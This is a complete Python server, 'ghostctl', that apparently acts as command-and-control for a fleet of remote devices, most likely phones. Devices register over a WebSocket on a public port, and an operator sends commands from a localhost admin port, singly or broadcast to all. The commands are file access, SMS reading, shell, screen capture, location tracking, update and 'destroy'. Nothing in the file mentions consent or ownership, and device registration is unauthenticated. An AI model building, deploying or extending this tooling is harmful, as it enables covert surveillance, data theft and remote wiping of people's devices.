#!/usr/bin/env python3
"""ghostctl core daemon.

Device-facing WebSocket listener (default 0.0.0.0:8443) + admin JSON-RPC
listener on localhost (default 127.0.0.1:8444, used by ghostctl.py CLI).

Device protocol (JSON messages over WebSocket):
  client -> server: {"type":"hello","device_id":..,"battery":..,"ip":..}
                   {"type":"ping"}
                   {"type":"info","battery":..,"ip":..}
                   {"type":"result","cmd_id":..,"ok":true,"result":..}
  server -> client: {"type":"welcome"}
                   {"type":"cmd","cmd_id":..,"action":..,"args":[..]}

State: server/state.json   (device registry)
       server/history.json (command history)
"""
import argparse
import asyncio
import json
import sys
import time
import uuid
from pathlib import Path

try:
    import websockets
except ImportError:
    sys.stderr.write("missing dependency: pip install --user websockets\n")
    raise

BASE = Path(__file__).resolve().parent
STATE_FILE = BASE / "state.json"
HISTORY_FILE = BASE / "history.json"

ACTIONS = {"files", "sms", "shell", "screen", "loc", "update", "destroy"}


def load_json(path, default):
    try:
        return json.loads(path.read_text())
    except (FileNotFoundError, json.JSONDecodeError):
        return default


def save_json(path, data):
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(json.dumps(data, indent=2, sort_keys=True))
    tmp.replace(path)


class Daemon:
    def __init__(self):
        self.devices = load_json(STATE_FILE, {})  # device_id -> status dict
        self.history = load_json(HISTORY_FILE, [])
        self.conns = {}    # device_id -> websocket
        self.pending = {}  # cmd_id -> {"event","result","ok"}

    # ---------- persistence ----------
    def persist_state(self):
        save_json(STATE_FILE, self.devices)

    def persist_history(self):
        save_json(HISTORY_FILE, self.history)

    # ---------- device registry ----------
    def touch(self, device_id, online, extra=None):
        d = self.devices.setdefault(device_id, {})
        d.update({"last_seen": time.time()})
        if online is not None:
            d["online"] = online
        if extra:
            d.update(extra)
        self.persist_state()

    def device_list(self):
        return self.devices

    # ---------- command router ----------
    async def dispatch(self, device_id, action, args, wait=10.0):
        """Send one command to one device, wait for its result."""
        if action not in ACTIONS:
            raise ValueError(f"unknown action {action!r}")
        ws = self.conns.get(device_id)
        if ws is None:
            raise ConnectionError(f"device {device_id} is offline")
        cmd_id = uuid.uuid4().hex[:12]
        rec = {"event": asyncio.Event(), "result": None, "ok": False}
        self.pending[cmd_id] = rec
        entry = {"cmd_id": cmd_id, "ts": time.time(), "device_id": device_id,
                 "action": action, "args": args, "status": "pending"}
        self.history.append(entry)
        self.persist_history()
        await ws.send(json.dumps({"type": "cmd", "cmd_id": cmd_id,
                                  "action": action, "args": args}))
        try:
            await asyncio.wait_for(rec["event"].wait(), timeout=wait)
            entry["status"] = "ok" if rec["ok"] else "error"
            entry["result"] = rec["result"]
        except asyncio.TimeoutError:
            entry["status"] = "timeout"
        self.persist_history()
        return entry

    async def broadcast(self, action, args, wait=10.0):
        """Send a command to every online device; returns per-device entries."""
        targets = [d for d, ws in self.conns.items() if ws is not None]
        if not targets:
            return {}
        entries = await asyncio.gather(
            *(self.dispatch(d, action, args, wait=wait) for d in targets),
            return_exceptions=True)
        out = {}
        for d, e in zip(targets, entries):
            out[d] = str(e) if isinstance(e, Exception) else e
        return out

    # ---------- websocket device handler ----------
    async def device_handler(self, ws):
        device_id = None
        try:
            async for raw in ws:
                try:
                    msg = json.loads(raw)
                except json.JSONDecodeError:
                    continue
                mtype = msg.get("type")
                if mtype == "hello":
                    device_id = msg.get("device_id")
                    if not device_id:
                        continue
                    self.conns[device_id] = ws
                    self.touch(device_id, online=True,
                               extra={"battery": msg.get("battery"),
                                      "ip": msg.get("ip") or ws.remote_address[0],
                                      "version": msg.get("version")})
                    await ws.send(json.dumps({"type": "welcome"}))
                elif device_id is None:
                    continue
                elif mtype == "ping":
                    self.touch(device_id, online=None)
                    await ws.send(json.dumps({"type": "pong"}))
                elif mtype == "info":
                    self.touch(device_id, online=None,
                               extra={"battery": msg.get("battery"),
                                      "ip": msg.get("ip")})
                elif mtype == "result":
                    rec = self.pending.pop(msg.get("cmd_id"), None)
                    if rec:
                        rec["ok"] = bool(msg.get("ok", True))
                        rec["result"] = msg.get("result")
                        rec["event"].set()
        finally:
            if device_id and self.conns.get(device_id) is ws:
                del self.conns[device_id]
                self.touch(device_id, online=False)

    # ---------- admin (CLI) handler: newline-delimited JSON ----------
    async def admin_handler(self, reader, writer):
        try:
            while True:
                line = await reader.readline()
                if not line:
                    break
                try:
                    req = json.loads(line)
                except json.JSONDecodeError:
                    resp = {"ok": False, "error": "bad json"}
                else:
                    resp = await self.admin_dispatch(req)
                writer.write((json.dumps(resp) + "\n").encode())
                await writer.drain()
        except (ConnectionResetError, BrokenPipeError):
            pass
        finally:
            writer.close()

    async def admin_dispatch(self, req):
        op = req.get("op")
        try:
            if op in ("list", "status", "devices"):
                return {"ok": True, "devices": self.device_list()}
            if op == "command":
                action, args = req["action"], req.get("args", [])
                wait = float(req.get("wait", 10))
                if req.get("all"):
                    return {"ok": True, "broadcast": True,
                            "results": await self.broadcast(action, args, wait)}
                entry = await self.dispatch(req["device_id"], action, args, wait)
                return {"ok": entry["status"] == "ok", "entry": entry}
            return {"ok": False, "error": f"unknown op {op!r}"}
        except Exception as e:  # noqa: BLE001 - report to CLI
            return {"ok": False, "error": str(e)}

    async def run(self, bind, port, admin_host, admin_port):
        admin = await asyncio.start_server(self.admin_handler, admin_host, admin_port)
        async with websockets.serve(self.device_handler, bind, port):
            print(f"ghostctl daemon: devices ws://{bind}:{port}, "
                  f"admin {admin_host}:{admin_port}", flush=True)
            async with admin:
                await admin.serve_forever()


def main():
    p = argparse.ArgumentParser(description="ghostctl core daemon")
    p.add_argument("--bind", default="0.0.0.0")
    p.add_argument("--port", type=int, default=8443)
    p.add_argument("--admin-host", default="127.0.0.1")
    p.add_argument("--admin-port", type=int, default=8444)
    a = p.parse_args()
    asyncio.run(Daemon().run(a.bind, a.port, a.admin_host, a.admin_port))


if __name__ == "__main__":
    main()
